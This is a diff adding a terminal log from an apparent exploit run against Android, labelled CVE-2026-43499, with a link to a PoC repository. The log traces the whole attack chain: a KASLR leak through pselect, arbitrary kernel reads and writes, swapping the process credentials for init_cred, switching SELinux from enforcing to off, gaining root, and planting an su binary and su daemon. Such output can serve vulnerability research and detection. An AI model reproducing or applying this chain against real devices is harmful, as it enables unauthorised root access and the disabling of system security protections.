@@ -1,0 +1,70 @@
+[34m=======================================================================[0m
+[97m                     CVE-2026-43499 Challenge Gate[0m
+[34m=======================================================================[0m
+[32m[Author] Kernix[0m
+[32m[Repository] https://github.com/Linuxoid-cn/CVE-2026-43499-Poc-Analysis[0m
+[33m[Challenge][0m [35m8bdwtbiynfjisfcd[0m
+[33m[Signature] Enter value: [0m[32mpassword verify ok[0m
+[32m[+] [0mpreload starting pid=12820
+[32m[+] [0mruntime performance cpu=7 max_freq=4608000 capacity=1024
+[32m[+] [0mstartup pid=12820 uid=2000 attr=u:r:shell:s0 enforce=1 direct_cpu=7
+[33m[*] [0mslide ktext calibrated base=ffffffd7a7200000 cpu=0 sites=ad73f0,ccc2fc
+[33m[*] [0mslide attempt 1 uses pselect shift=12
+[32m[+] [0mslide child pid=17334 uid=2000 direct_cpu=7
+[33m[*] [0mslide pselect setup shift=12 page=ffffff8ac84b8000 fake_lock=ffffff8ac84b84d0 fake_w0=ffffff8ac84b93a0 fake_task=ffffff8ac84ba380
+[33m[*] [0mslide res readiness installed=137
+[33m[*] [0mslide res enc in=0000000000000082 0000000000000000 ffffffd7a95e20e0 0000000000000000 ffffffd7a970b558 out=0000000000000082 0000000000000000 ffffffd7a95ecf00 ffffff8ac84b84d0 0000000000000003 ex=0000000000000000 0000000000000000 ffffffd7a95e20e0 nready=137
+[33m[*] [0mslide pselect before syscall
+[33m[*] [0mslide consumer before tgkill tid=17335 calls=1
+[33m[*] [0mslide consumer before sched tid=17335 alive_ret=0 alive_errno=0
+[33m[*] [0mslide consumer sched tid=17335 alive_ret=0 alive_errno=0 sched_ret=0 sched_errno=0
+[33m[*] [0mslide pselect returned ret=178 errno=0 calls=1 sched_ok=1 last_sched_ret=0 last_sched_errno=0
+[32m[+] [0mslide boot_id_leaked_nfulnl_logger pid=17334 value=ffffffd7a95e2198 stext=ffffffd7a7200000
+[32m[+] [0mslide boot_id-derived_stext pid=17334 value=ffffffd7a7200000
+[32m[+] [0mslide-kaslr-ok pid=12820 base=ffffffd7a7200000 slide=0000001727200000
+[33m[*] [0mslide generation released before direct stage
+[32m[+] [0mdirect mode=init_cred runtime_cpu=7
+[32m[+] [0mdirect-step direct_root_enter uid=2000 pid=12820
+[32m[+] [0mdirect-root-parent cpu=7 pid=12820 tid=12820
+[32m[+] [0mdirect-r64-plan name=per_cpu_offset attempt=1/3 idx=0 shape=0 cpu=7 pid=12820 tid=12820 B=ffffffd7a970b558 Q=ffffffd7a95db848 Q8=ffffffd7a95db850 Q16=ffffffd7a95db858
+[32m[+] [0mdirect-w64[0] target=ffffffd7a970b558 value=ffffffd7a95db848 shape=0 workspace=ffffff8ac84c8000
+[33m[*] [0mpselect res prepare attempt=1 page=ffffff8ac84c8000 target=ffffffd7a970b558 value=ffffffd7a95db848
+[33m[*] [0mpselect res readiness attempt=1 installed=137
+[33m[*] [0mpselect res attempt=1 ret=172 errno=0 calls=1 success=1 installed=137
+[32m[+] [0mdirect-r64-oracle name=per_cpu_offset attempt=1 idx=0 shape=0 cpu_before=7 cpu_after_trigger=7 cpu_after_read=7 value=ffffffb3be61d000 sidecar=ffffffd7a970b558 expected_sidecar=ffffffd7a970b558 raw8=58 expected_raw8=58 ok=1
+[32m[+] [0mdirect-percpu cpu=7 base=ffffffd7a95db810 slot=ffffffd7a95db848 delta=ffffffb3be61d000 page_aligned=1 entry_slot=ffffff8b67baf400 direct=1 aligned=1
+[32m[+] [0mdirect entry_slot=ffffff8b67baf400 cpu=7 delta=ffffffb3be61d000
+[32m[+] [0mdirect-r64-plan name=entry_task attempt=1/3 idx=1 shape=0 cpu=7 pid=12820 tid=12820 B=ffffffd7a970b558 Q=ffffff8b67baf400 Q8=ffffff8b67baf408 Q16=ffffff8b67baf410
+[32m[+] [0mdirect-w64[1] target=ffffffd7a970b558 value=ffffff8b67baf400 shape=0 workspace=ffffff8910a98000
+[33m[*] [0mpselect res prepare attempt=1 page=ffffff8910a98000 target=ffffffd7a970b558 value=ffffff8b67baf400
+[33m[*] [0mpselect res readiness attempt=1 installed=134
+[33m[*] [0mpselect res attempt=1 ret=168 errno=0 calls=1 success=1 installed=134
+[32m[+] [0mdirect-r64-oracle name=entry_task attempt=1 idx=1 shape=0 cpu_before=7 cpu_after_trigger=7 cpu_after_read=7 value=ffffff89f6262c80 sidecar=ffffffd7a970b558 expected_sidecar=ffffffd7a970b558 raw8=58 expected_raw8=58 ok=1
+[32m[+] [0mdirect-entry cpu=7 observed_cpu=7 slot=ffffff8b67baf400 task=ffffff89f6262c80 direct=1 aligned=1 pid=12820 tid=12820
+[32m[+] [0mdirect entry sample task=ffffff89f6262c80 pid=12820 cpu=7
+[32m[+] [0mdirect pre-cred selinux preserved enforcing=1
+[32m[+] [0mdirect-step before_init_cred uid=2000 pid=12820 task=ffffff89f6262c80
+[32m[+] [0mdirect-step install_real_cred attempt=1/3 target=ffffff89f6263578 value=ffffffd7a9602cb0
+[32m[+] [0mdirect-w64[2] target=ffffff89f6263578 value=ffffffd7a9602cb0 shape=1 workspace=ffffff80304c0000
+[33m[*] [0mpselect res prepare attempt=1 page=ffffff80304c0000 target=ffffff89f6263578 value=ffffffd7a9602cb0
+[33m[*] [0mpselect res readiness attempt=1 installed=97
+[33m[*] [0mpselect res attempt=1 ret=159 errno=0 calls=1 success=1 installed=97
+[32m[+] [0mdirect-step install_cred_then_selinux_zero target=ffffff89f6263580 value=ffffffd7a9602cb0 followup=ffffffd7a98663c8
+[32m[+] [0mdirect-w64[3] target=ffffff89f6263580 value=ffffffd7a9602cb0 shape=1 workspace=ffffff8ac84c8000
+[33m[*] [0mpselect res prepare attempt=1 page=ffffff8ac84c8000 target=ffffff89f6263580 value=ffffffd7a9602cb0
+[33m[*] [0mpselect res readiness attempt=1 installed=103
+[33m[*] [0mpselect res attempt=1 ret=168 errno=0 calls=1 success=1 installed=103
+[32m[+] [0mdirect-w64[4] target=ffffffd7a98663c8 value=ffffff8ac84c8100 shape=1 workspace=ffffff8a938f8000
+[33m[*] [0mpselect res prepare attempt=1 page=ffffff8a938f8000 target=ffffffd7a98663c8 value=ffffff8ac84c8100
+[33m[*] [0mpselect res readiness attempt=1 installed=98
+[33m[*] [0mpselect res attempt=1 ret=166 errno=0 calls=1 success=1 installed=98
+[32m[+] [0mdirect credential result uid=0 euid=0 gid=0 egid=0 task=ffffff89f6262c80 init_cred=ffffffd7a9602cb0 selinux=1->0 policy_reload=2032092
+uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
+[32m[+] [0membedded su wrote 15312 bytes to /apex/com.android.virt/bin/su
+[32m[+] [0membedded su wrote 15312 bytes to /data/local/tmp/su
+[33m[*] [0mlocal su client install ok=1 path=/data/local/tmp/su
+[32m[+] [0membedded su wrote 15312 bytes to /apex/com.android.virt/bin/su
+[33m[*] [0madb-visible su install adbd=6679 ok=1 path=/apex/com.android.virt/bin/su
+[32m[+] [0membedded su daemon ready pid=13391 socket=/data/local/tmp/temp_su.sock
+[32m[+] [0mdirect-root-summary root=1 id=1 su=1/2 daemon=13391 selinux=1->0 uid=0 euid=0 gid=0 egid=0
+EXITCODE=0
